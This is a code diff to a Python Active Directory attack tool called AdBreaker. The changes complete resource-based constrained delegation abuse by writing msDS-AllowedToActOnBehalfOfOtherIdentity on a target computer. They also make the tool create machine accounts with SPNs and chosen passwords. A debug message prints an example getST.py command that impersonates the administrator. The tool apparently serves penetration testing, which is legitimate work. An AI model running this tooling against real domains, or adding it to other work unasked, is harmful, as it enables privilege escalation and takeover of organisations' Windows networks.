@@ -247,11 +247,33 @@ class AdBreaker:
     def _encode_password(self, password: str) -> bytes:
         return '"{}"'.format(password).encode('utf-16-le')
 
+    def _get_configuration_name_context(self) -> str:
+        return self.server.info.other.get('configurationNamingContext')[0]
 
-    def get_allowed_to_act(self, dn):
+    def _get_domain_from_naming_context(self) -> str:
+        return '.'.join([a.replace('DC=','') for a in self._get_configuration_name_context().split(',')])
+
+    def _get_domain_from_service_name(self) -> str:
+        return self.server.info.other.get('ldapServiceName')[0].split(':')[0]
+        
+
+    def read_allowed_to_act(self, dn: str):
+        results = self.run_query(f'(distinguishedName={dn})', attributes=['msDS-AllowedToActOnBehalfOfOtherIdentity'], parse_security_fields=True)
+        if len(results) > 0 and 'msDS-AllowedToActOnBehalfOfOtherIdentity' in results[0]:
+            allowed_to_act = results[0].get('msDS-AllowedToActOnBehalfOfOtherIdentity')
+            if allowed_to_act and 'Dacls' in allowed_to_act:
+                return [self.lookup_by_sid(a['Sid']).get('distinguishedName') for a in allowed_to_act['Dacls']]
+            else:
+                self.logger.info('No allowed to act')    
+        else:
+            self.logger.info('No allowed to act')
+
+
+
+    def get_allowed_to_act(self, dn: str):
         '''Get target's msDS-AllowedToActOnBehalfOfOtherIdentity attribute'''
 
-        results = self.run_query(f'(distinguishedName={dn})', attributes=['distinguishedName', 'sAMAccountName', 'objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'], parse_security_fields=False)
+        results = self.run_query(f'(distinguishedName={dn})', attributes=['distinguishedName', 'sAMAccountName', 'objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
         if not results:
             self.logger.error(f'Could not find object {dn}')
             return 
@@ -277,12 +299,14 @@ class AdBreaker:
     def write_allowed_to_act(self, target_computer_dn: str, acting_computer_dn: str):
         '''Write allowed to act'''
 
-        delegate_from_sid = self.lookup_by_distinguished_name(acting_computer_dn).get('objectSid', None)
-        if not delegate_from_sid:
+        delegate_from_details = self.lookup_by_distinguished_name(acting_computer_dn)
+        if not delegate_from_details:
             self.logger.error(f'Could not find acting computer with DN {acting_computer_dn}')
             return
+        delegate_from_sid = delegate_from_details.get('objectSid', None)
 
         sd, delegate_to_object = self.get_allowed_to_act(target_computer_dn)
+        allowed = False
 
         if delegate_from_sid not in [ ace['Ace']['Sid'].formatCanonical() for ace in sd['Dacl'].aces ]:
             sd['Dacl'].aces.append(utils.create_allow_ace(delegate_from_sid))
@@ -290,6 +314,7 @@ class AdBreaker:
             if result['result'] == 0:
                 self.logger.info('Delegation rights modified successfully!')
                 self.logger.info(f'{acting_computer_dn} can now impersonate users on {target_computer_dn} via S4U2Proxy')
+                allowed = True
             else:
                 if result['result'] == 50:
                     self.logger.error(f'Could not modify object, the server reports insufficient rights: {result["message"]}')
@@ -299,6 +324,15 @@ class AdBreaker:
                     self.logger.error(f'The server returned an error: {result["message"]}')
         else:
             self.logger.info(f'{acting_computer_dn} can already impersonate users on {target_computer_dn} via S4U2Proxy - not modifying!')
+            allowed = True
+
+        if self.logger.level < logging.INFO and allowed:
+            domain_name = self._get_domain_from_naming_context()
+            acting_acct = delegate_from_details.get('sAMAccountName')
+            target_acct = self.lookup_by_distinguished_name(target_computer_dn, extra_attributes=['servicePrincipalName'])
+            target_dns = target_acct.get('dNSHostName')
+            self.logger.debug('Target computer SPNs: {}'.format(', '.join([a for a in target_acct.get('servicePrincipalName', [])])))
+            self.logger.debug(f'Example impersonate S4U command: getST.py -spn "HOST/{target_dns}" -impersonate administrator -dc-ip {self.host} "{domain_name}/{acting_acct}"')
 
         return
 
@@ -351,20 +385,20 @@ class AdBreaker:
         self.connection.extend.microsoft.modify_password(user=dn, new_password=new_password, old_password=old_password)
         return self.connection.result
 
-    def lookup_by_account_name(self, account_name: str, log: bool=False):
-        results = self.run_query(f'(sAMAccountName={account_name})', attributes=['distinguishedName', 'objectSid', 'sAMAccountName', 'userPrincipalName'], log=log)
+    def lookup_by_account_name(self, account_name: str, log: bool=False, extra_attributes: list=[]):
+        results = self.run_query(f'(sAMAccountName={account_name})', attributes=['distinguishedName', 'objectSid', 'sAMAccountName', 'userPrincipalName', 'dNSHostName'] + extra_attributes, log=log)
         return results[0] if len(results) == 1 else None
 
-    def lookup_by_distinguished_name(self, dn: str, log: bool=False):
-        results = self.run_query(f'(distinguishedName={dn})', attributes=['distinguishedName', 'objectSid', 'sAMAccountName', 'userPrincipalName'], log=log)
+    def lookup_by_distinguished_name(self, dn: str, log: bool=False, extra_attributes: list=[]):
+        results = self.run_query(f'(distinguishedName={dn})', attributes=['distinguishedName', 'objectSid', 'sAMAccountName', 'userPrincipalName', 'dNSHostName'] + extra_attributes, log=log)
         return results[0] if len(results) == 1 else None
 
-    def lookup_by_upn(self, upn: str, log: bool=False):
-        results = self.run_query(f'(userPrincipalName={upn})', attributes=['distinguishedName', 'objectSid', 'sAMAccountName', 'userPrincipalName'], log=log)
+    def lookup_by_upn(self, upn: str, log: bool=False, extra_attributes: list=[]):
+        results = self.run_query(f'(userPrincipalName={upn})', attributes=['distinguishedName', 'objectSid', 'sAMAccountName', 'userPrincipalName', 'dNSHostName'] + extra_attributes, log=log)
         return results[0] if len(results) == 1 else None
 
-    def lookup_by_sid(self, sid: str, log: bool=False):
-        results = self.run_query(f'(objectSid={sid})', attributes=['distinguishedName', 'objectSid', 'sAMAccountName', 'userPrincipalName'], log=log)
+    def lookup_by_sid(self, sid: str, log: bool=False, extra_attributes: list=[]):
+        results = self.run_query(f'(objectSid={sid})', attributes=['distinguishedName', 'objectSid', 'sAMAccountName', 'userPrincipalName', 'dNSHostName'] + extra_attributes, log=log)
         return results[0] if len(results) == 1 else None
 
 
@@ -388,7 +422,7 @@ class AdBreaker:
 
 
     # pwdlastset to 0 to force pwd change
-    def create_user(self, dn: str, password: str, given_name: str, surname: str, account_name: str, user_principal_name: str='', display_name: str=None, mail: str=None, uac_flags: list=None):
+    def add_user(self, dn: str, password: str, given_name: str, surname: str, account_name: str, user_principal_name: str='', display_name: str=None, mail: str=None, uac_flags: list=None):
         objectClass = ['user']
         uac_flags = uac_flags if uac_flags else self.uac_default_flags
         # TODO: verify UAC flags are accurate
@@ -417,23 +451,26 @@ class AdBreaker:
 
 
 
-    def add_computer(self, dn:str, computername: str, password: str, constrained_delegations: list=[]):
+    def add_computer(self, dn:str, password: str, constrained_delegations: list=[], dns_domain: str=None):
+        name = dn.split(',')[0].upper().replace('CN=','')
+        if not dns_domain:
+            dns_domain = self._get_domain_from_service_name()
 
-        
         ## Default computer SPNs
         spns = [
-        #    'HOST/%s' % computerHostname,
-        #    'HOST/%s.%s' % (computerHostname, self.__domain),
-        #    'RestrictedKrbHost/%s' % computerHostname,
-        #    'RestrictedKrbHost/%s.%s' % (computerHostname, self.__domain),
+            f'HOST/{name}',
+            f'HOST/{name}.{dns_domain}',
+            f'RestrictedKrbHost/{name}',
+            f'RestrictedKrbHost/{name}.{dns_domain}'
         ]
 
         attributes = {
-        #    'dnsHostName': '%s.%s' % (computerHostname, self.__domain),
-            'userAccountControl': 0x1000,
+            'displayName': f'{name}$',
+            'dNSHostName': f'{name}.{dns_domain}',
             'servicePrincipalName': spns,
-        #    'sAMAccountName': self.__computerName,
-            'unicodePwd': self._encode_password(password)
+            'sAMAccountName': f'{name}$',
+            'unicodePwd': self._encode_password(password),
+            'userAccountControl': 0x1000
         }
         
         # Add constrained delegations fields to the computer
@@ -452,78 +489,25 @@ class AdBreaker:
             if result['result'] == ldap3.core.results.RESULT_UNWILLING_TO_PERFORM:
                 error_code = int(result['message'].split(':')[0].strip(), 16)
                 if error_code == 0x216D:
-                    raise Exception("User machine quota exceeded!")
+                    self.logger.error('User machine quota exceeded!')
                 else:
-                    raise Exception(str(self.ldapConn.result))
+                    self.logger.error(str(self.ldapConn.result))
             elif result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
-                raise Exception("User doesn't have right to create a machine account!")
+                self.logger.error('User doesnt have right to create a machine account!')
             elif result['result'] == ldap3.core.results.RESULT_CONSTRAINT_VIOLATION:
-                raise Exception("User doesn't have right to create constrained delegations!")
+                self.logger.error('User doesnt have right to create constrained delegations!')
             else:
-                raise Exception(str(result))
+                self.logger.error(str(result))
         else:
-            self.logger.info(f'Successfully added machine account {computername} with password {password}.')
+            self.logger.info(f'Successfully added machine account {name} with password {password}.')
 
 
-
-
-        #if self.__computerName is not None:
-        #    if self.LDAPComputerExists(self.ldapConn, self.__computerName):
-        #        raise Exception("Account %s already exists! If you just want to set a password, use -no-add." % self.__computerName)
-        #else:
-        #    while True:
-        #        self.__computerName = self.generateComputerName()
-        #        if not self.LDAPComputerExists(self.ldapConn, self.__computerName):
-        #            break
-
-
-        #computerHostname = self.__computerName[:-1]
-        #computerDn = ('CN=%s,%s' % (computerHostname, self.__computerGroup))
-
-        ## Default computer SPNs
-        #spns = [
-        #    'HOST/%s' % computerHostname,
-        #    'HOST/%s.%s' % (computerHostname, self.__domain),
-        #    'RestrictedKrbHost/%s' % computerHostname,
-        #    'RestrictedKrbHost/%s.%s' % (computerHostname, self.__domain),
-        #]
-        #ucd = {
-        #    'dnsHostName': '%s.%s' % (computerHostname, self.__domain),
-        #    'userAccountControl': 0x1000,
-        #    'servicePrincipalName': spns,
-        #    'sAMAccountName': self.__computerName,
-        #    'unicodePwd': ('"%s"' % self.__computerPassword).encode('utf-16-le')
-        #}
-
-        ## Add constrained delegations fields to the computer
-        #if constrained_delegations and len(constrained_delegations) > 0:
-        #    # Set the TRUSTED_TO_AUTH_FOR_DELEGATION and WORKSTATION_TRUST_ACCOUNT flags
-        #    # MS doc: https://learn.microsoft.com/fr-fr/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties
-        #    ucd['userAccountControl'] = 0x1000000|0x1000
-        #    # Set the list of services authorized (format: protocol/FQDNserver)
-        #    ucd['msDS-AllowedToDelegateTo'] = constrained_delegations.split(',') #Split multiple services in the command line
-        #    logging.info("Adding constrained delegations services to the computer object: %s" % constrained_delegations)
-
-        #res = self.ldapConn.add(computerDn, ['top','person','organizationalPerson','user','computer'], ucd)
-        #if not res:
-        #    if self.ldapConn.result['result'] == ldap3.core.results.RESULT_UNWILLING_TO_PERFORM:
-        #        error_code = int(self.ldapConn.result['message'].split(':')[0].strip(), 16)
-        #        if error_code == 0x216D:
-        #            raise Exception("User machine quota exceeded!")
-        #        else:
-        #            raise Exception(str(self.ldapConn.result))
-        #    elif self.ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
-        #        raise Exception("User doesn't have right to create a machine account!")
-        #    elif self.ldapConn.result['result'] == ldap3.core.results.RESULT_CONSTRAINT_VIOLATION:
-        #        raise Exception("User doesn't have right to create constrained delegations!")
-        #    else:
-        #        raise Exception(str(self.ldapConn.result))
-        #else:
-        #    logging.info("Successfully added machine account %s with password %s." % (self.__computerName, self.__computerPassword))
-
-
-
-
+    def get_ntauth_certificates(self):
+        results = self.run_query('(&(objectClass=certificationAuthority)(cn=NTAuthCertificates))', base=self._get_configuration_name_context())
+        if not results:
+            self.logger.error('No Auth Certificates found')
+            return
+        s = results[0].get('cACertificate')
 
 
     def get_ace_flag_constants(self):
